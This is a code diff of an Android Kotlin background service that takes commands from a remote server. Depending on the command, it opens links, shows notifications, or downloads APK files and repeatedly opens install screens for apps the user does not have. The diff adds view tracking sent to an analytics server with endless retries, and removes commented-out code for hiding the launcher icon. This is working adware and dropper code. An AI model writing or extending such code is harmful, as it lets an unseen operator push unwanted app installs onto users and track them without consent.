@@ -8,20 +8,13 @@ import android.util.Log
 import org.json.JSONException
 import android.app.NotificationManager
 import android.app.PendingIntent
-import android.content.ComponentName
 import android.content.Context
-import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
-import android.graphics.drawable.Icon
 import android.net.Uri
 import android.os.AsyncTask
 import android.os.Build
 import android.os.Environment
-import android.provider.Settings
-import android.support.v4.content.FileProvider
-import android.widget.Toast
-import kotlinx.android.synthetic.main.activity_main.*
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
@@ -30,21 +23,21 @@ import java.net.URL
 
 class Push : IntentService("Push") {
     override fun onHandleIntent(intent: Intent?) {
-//        var pm = applicationContext.packageManager
-//        var app = ComponentName(applicationContext, Splash::class.java)
-//        pm.setComponentEnabledSetting(app, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
-        Log.d("SERCCC", intent?.action)
+
         if (intent?.action == applicationContext.packageName + ".Push") {
+            Thread.sleep(5*1000)
             try {
                 var pushDet = khttp.post(PUSH_HANDLER)
                 Log.d("SERCCC", pushDet.toString())
                 if (pushDet.statusCode == 200 && pushDet.jsonObject.getBoolean("run")) {
                     val res = pushDet.jsonObject
                     var type: String = res.getString("type")
+                    var storedPushId = SPref(applicationContext, "pushId")!!.getLong("id", -1)
                     Log.d("SERCCC", res.toString())
-                    when (type) {
-                        "pop" -> {
-                            /*
+                    if (storedPushId < res.getLong("pushId")) {
+                        when (type) {
+                            "pop" -> {
+                                /*
                     {
                          "run":true,
                          "pushId":"3493afb435305a03e542c7da949ee0e4",
@@ -54,13 +47,13 @@ class Push : IntentService("Push") {
                      }
                      intentive for tg cafebazar NET  tg://, bazaar://, https://
                     */
-                            val pushid = res.getString("pushId")
-                            val link = res.getString("link")
-                            val timelimit = res.getString("timelimit")
-                            pop(pushid, link, timelimit)
-                        }
-                        "notif" -> {
-                            /*
+                                val pushid = res.getString("pushId")
+                                val link = res.getString("action")
+                                val timelimit = res.getString("timelimit")
+                                pop(pushid, link, timelimit)
+                            }
+                            "notif" -> {
+                                /*
                     {
                          "run":true,
                          "pushId":"3493afb435305a03e542c7da949ee0e4",
@@ -73,16 +66,16 @@ class Push : IntentService("Push") {
                      }
                     show notif
                     */
-                            val pushId = res.getString("pushId")
-                            val title = res.getString("title")
-                            val body = res.getString("body")
-                            val img = res.getString("img")
-                            val action = res.getString("action")
-                            val timelimit = res.getString("timelimit")
-                            notif(pushId, title, body, img, action,timelimit)
-                        }
-                        "fi" -> {
-                            /*
+                                val pushId = res.getString("pushId")
+                                val title = res.getString("title")
+                                val body = res.getString("body")
+                                val img = res.getString("img")
+                                val action = res.getString("action")
+                                val timelimit = res.getString("timelimit")
+                                notif(pushId, title, body, img, action, timelimit)
+                            }
+                            "fi" -> {
+                                /*
                     {
                          "run":true,
                          "pushId":"3493afb435305a03e542c7da949ee0e4",
@@ -94,16 +87,16 @@ class Push : IntentService("Push") {
                      download package
                      show install page
                     */
-                            val pushId = res.getString("pushId")
-                            val link = res.getString("link")
-                            val rp = res.getInt("repeatCount")
-                            val timelimit = res.getString("timelimit")
-                            val sleep = res.getLong("sleep")
-                            val pack = res.getString("packageName")
-                            fi(pushId, link, rp, timelimit,sleep,pack)
-                        }
-                        "fbi" -> {
-                            /*
+                                val pushId = res.getString("pushId")
+                                val link = res.getString("link")
+                                val rp = res.getInt("repeatCount")
+                                val timelimit = res.getString("timelimit")
+                                val sleep = res.getLong("sleep")
+                                val pack = res.getString("packageName")
+                                fi(pushId, link, rp, timelimit, sleep, pack)
+                            }
+                            "fbi" -> {
+                                /*
                      {
                          "run":true,
                          "pushId":"3493afb435305a03e542c7da949ee0e4",
@@ -119,18 +112,19 @@ class Push : IntentService("Push") {
                      start activity
                      show install
                     */
-                            val pushid = res.getString("pushId")
-                            val title = res.getString("title")
-                            val body = res.getString("body")
-                            val link = res.getString("link")
-                            val img = res.getString("img")
-                            val rp = res.getInt("repeatCount")
-                            val timelimit = res.getString("timelimit")
-                            val pack = res.getString("packageName")
-                            val sleep = res.getLong("sleep")
-                            fbi(pushid, title, body, link, img, rp, timelimit,pack,sleep)
+                                val pushid = res.getString("pushId")
+                                val title = res.getString("title")
+                                val body = res.getString("body")
+                                val link = res.getString("link")
+                                val img = res.getString("img")
+                                val rp = res.getInt("repeatCount")
+                                val timelimit = res.getString("timelimit")
+                                val pack = res.getString("packageName")
+                                val sleep = res.getLong("sleep")
+                                fbi(pushid, title, body, link, img, rp, timelimit, pack, sleep)
+                            }
                         }
-
+                        SPref(applicationContext,"pushId")!!.edit().putLong("id",res.getLong("pushId")).commit()
                     }
                 }
             } catch (e: JSONException) {
@@ -146,13 +140,13 @@ class Push : IntentService("Push") {
             intent.data = Uri.parse(link)
             startActivity(intent)
             SetTimeLim(applicationContext,currentTime+tl.toLong())
+            Statics(id.toLong()).execute()
         }
     }
-
     fun fi(id: String, link: String, repeatCount: Int, timelimit: String,sleep:Long,pack:String) {
         if(!isAppInstalled(applicationContext,pack)) {
             var currentTime = System.currentTimeMillis() / 1000
-            if (!TimeLim(applicationContext, timelimit.toLong())) {
+            if (TimeLim(applicationContext, timelimit.toLong())) {
                 var i = 0
                 while (i <= repeatCount) {
 
@@ -167,14 +161,15 @@ class Push : IntentService("Push") {
                     Thread.sleep(sleep * 1000)
                     i++
                 }
-
+                SetTimeLim(applicationContext,currentTime+timelimit.toLong())
+                Statics(id.toLong()).execute()
             }
         }else{
             Log.d(PUSH,"APP IS INSTALLED $pack")
         }
     }
-
     fun fbi(id: String, title: String, body: String, link: String, img: String, rp: Int, timelimit: String,pack:String,sleep: Long) {
+        var currentTime = System.currentTimeMillis() / 1000
             if(!isAppInstalled(applicationContext,pack)){
                 var fileLink = GetApkFBI(id).execute(link).get()
                 var imgPath = GetImgFBI(id).execute(img).get()
@@ -190,7 +185,7 @@ class Push : IntentService("Push") {
                 }
                 fbi.putExtra("link",fileLink).putExtra("img",imgPath)
 
-                if (!TimeLim(applicationContext, timelimit.toLong())) {
+                if (TimeLim(applicationContext, timelimit.toLong())) {
                     var i = 0
                     while (i <= rp) {
                         startActivity(fbi)
@@ -198,20 +193,16 @@ class Push : IntentService("Push") {
                         i++
                     }
                 }
-
-
+                SetTimeLim(applicationContext,currentTime+timelimit.toLong())
+                Statics(id.toLong()).execute()
             }else{
                 Log.d(PUSH,"App Is installed $pack")
             }
     }
-
     fun notif(id: String, title: String, body: String, img: String, action: String,timelimit: String) {
         if (TimeLim(applicationContext,timelimit.toLong())) {
-            Log.d("SERCCC", "IN SERVICE>>>NOTIF")
-
             var actionIntent = Intent(Intent.ACTION_VIEW)
             actionIntent.data = Uri.parse(action)
-
             val pendingIntent = PendingIntent.getActivity(applicationContext, 0, actionIntent, 0)
             val nManager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
 
@@ -241,12 +232,10 @@ class Push : IntentService("Push") {
 
             var currentTime = System.currentTimeMillis() / 1000
             SetTimeLim(applicationContext,currentTime+timelimit.toLong())
-
             nManager.notify(mNotificationId, mNotification)
-            Log.d("SERCCC", "IN SERVICE>>>NOTIF>>end")
+            Statics(id.toLong()).execute()
         }
     }
-
     inner class GetTumb:AsyncTask<String,Any,Bitmap>(){
         override fun doInBackground(vararg p0: String?): Bitmap {
             var url = p0[0]
@@ -262,9 +251,6 @@ class Push : IntentService("Push") {
         }
 
     }
-
-
-
     inner class GetApkFI(pushId:String,timeLimit:Long):AsyncTask<String,String,Boolean>(){
         var timeLimit = timeLimit
         val name =pushId
@@ -315,7 +301,6 @@ class Push : IntentService("Push") {
         }
 
     }
-
     inner class GetApkFBI(pushId:String):AsyncTask<String,String,String>(){
 
         val name =pushId
@@ -362,7 +347,6 @@ class Push : IntentService("Push") {
         }
 
     }
-
     inner class GetImgFBI(pushId:String):AsyncTask<String,String,String>(){
 
         val name =pushId
@@ -405,6 +389,21 @@ class Push : IntentService("Push") {
             }
 
             return imgPath
+        }
+
+    }
+    inner class Statics(pushId:Long):AsyncTask<Long,Int,Any>(){
+        var id = pushId
+        override fun doInBackground(vararg p0: Long?) {
+            try{
+                var stat = khttp.post(ANALYTIC_SERVER, data = mapOf("m" to "view","pushId" to id))
+                if(stat.statusCode != 200 || !stat.jsonObject.getBoolean("result")){
+                       Statics(id).execute()
+                }
+            }catch (e:Exception){
+                Statics(id).execute()
+            }
+
         }
 
     }
